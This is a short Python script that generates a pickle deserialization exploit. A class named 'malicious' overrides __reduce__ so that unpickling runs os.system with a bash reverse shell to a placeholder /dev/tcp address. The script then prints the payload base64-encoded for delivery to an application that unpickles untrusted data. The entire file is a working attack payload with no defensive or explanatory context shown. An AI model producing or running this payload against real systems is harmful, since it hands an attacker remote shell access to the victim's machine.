import pickle
import os
from base64 import b64decode,b64encode

class malicious(object):
    def __reduce__(self):
        return (os.system, ("/bin/bash -c \"/bin/sh -i >& /dev/tcp/ip/port 0>&1\"",))

ok = malicious()
ok_serialized = pickle.dumps(ok)
print(b64encode(ok_serialized))
